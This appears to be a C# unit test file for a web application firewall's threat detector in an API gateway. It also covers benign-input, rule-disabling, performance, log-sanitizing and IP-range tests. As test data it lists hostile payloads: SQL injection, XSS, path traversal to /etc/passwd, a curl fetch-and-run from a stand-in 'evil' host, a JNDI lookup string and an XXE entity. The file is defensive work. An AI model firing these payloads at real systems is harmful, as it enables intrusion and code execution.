using System.Diagnostics;
using Secure.Gateway.API.Logging;
using Secure.Gateway.API.Security;
using Secure.Gateway.API.Security.Waf;

namespace Secure.Gateway.API.Tests;

public sealed class ThreatDetectorTests
{
    [Theory]
    [InlineData("' OR '1'='1", "SqlInjection")]
    [InlineData("\" or 1=1", "SqlInjection")]
    [InlineData("1 or 1=1", "SqlInjection")]
    [InlineData("admin'--", "SqlInjection")]
    [InlineData("1 UNION ALL SELECT NULL,NULL", "SqlInjection")]
    [InlineData("1;exec xp_cmdshell 'dir'", "SqlInjection")]
    [InlineData("1' WAITFOR DELAY '0:0:5'--", "SqlInjection")]
    [InlineData("1 AND (SELECT 1 FROM information_schema.tables)", "SqlInjection")]
    [InlineData("1 AND extractvalue(1,concat(0x7e,version()))", "SqlInjection")]
    [InlineData("%27%20OR%20%271%27%3D%271", "SqlInjection")]
    [InlineData("&#39; OR &#39;1&#39;=&#39;1", "SqlInjection")]
    [InlineData("<ScRiPt>alert(1)</sCrIpT>", "Xss")]
    [InlineData("<a href=\"javascript:alert(1)\">x</a>", "Xss")]
    [InlineData("<body onload=alert(1)>", "Xss")]
    [InlineData("<iframe src=//evil>", "Xss")]
    [InlineData("..\\..\\windows\\win.ini", "PathTraversal")]
    [InlineData("file:///etc/passwd", "PathTraversal")]
    [InlineData("$(curl http://evil/x.sh)", "CommandInjection")]
    [InlineData("${jndi:ldap://evil/a}", "TemplateInjection")]
    [InlineData("<!DOCTYPE x [<!ENTITY xxe SYSTEM \"http://evil.example/x.dtd\">]>", "Xxe")]
    [InlineData("*)(|(uid=*", "LdapInjection")]
    public void DetectsAttack(string payload, string category)
    {
        var match = ThreatDetector.Scan(payload);
        Assert.NotNull(match);
        Assert.Equal(category, match.Category);
    }

    [Theory]
    [InlineData("O'Brien")]
    [InlineData("Rock 'n' roll and blues")]
    [InlineData("Please select the best option from the list")]
    [InlineData("Tom & Jerry")]
    [InlineData("C# and .NET 10")]
    [InlineData("price >= 10")]
    [InlineData("use the \"--force\" flag")]
    [InlineData("I'd like it delivered by 5pm")]
    [InlineData("jane.doe+news@example.com")]
    [InlineData("https://example.com/path?a=1&b=2")]
    [InlineData("2024-01-01T10:00:00Z")]
    [InlineData("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36")]
    [InlineData("100% cotton, size M/L")]
    [InlineData("SELECT")]
    [InlineData("Drop-off point: Gate 3")]
    public void AllowsBenignInput(string input)
    {
        Assert.Null(ThreatDetector.Scan(input));
    }

    [Fact]
    public void DisabledRule_IsSkipped()
    {
        var disabled = new HashSet<string> { "XSS-001" };
        Assert.Null(ThreatDetector.Scan("<script>", disabled));
    }

    [Fact]
    public void PathologicalInput_IsScannedInLinearTime()
    {
        var evil = new string('\'', 20_000) + string.Concat(Enumerable.Repeat(" or", 5_000));
        var sw = Stopwatch.StartNew();
        ThreatDetector.Scan(evil);
        Assert.True(sw.Elapsed < TimeSpan.FromSeconds(2), $"took {sw.Elapsed}");
    }

    [Fact]
    public void LogSanitizer_RemovesControlCharacters()
    {
        Assert.Equal("line1__fake log entry", LogSanitizer.Clean("line1\r\nfake log entry"));
    }

    [Theory]
    [InlineData("10.0.0.0/8", "10.20.30.40", true)]
    [InlineData("10.0.0.0/8", "11.0.0.1", false)]
    [InlineData("192.168.1.10", "192.168.1.10", true)]
    [InlineData("2001:db8::/32", "2001:db8::1", true)]
    public void IpNetworkParsing(string entry, string address, bool expected)
    {
        var network = IpFilterMiddleware.ParseNetwork(entry);
        Assert.Equal(expected, network.Contains(System.Net.IPAddress.Parse(address)));
    }
}
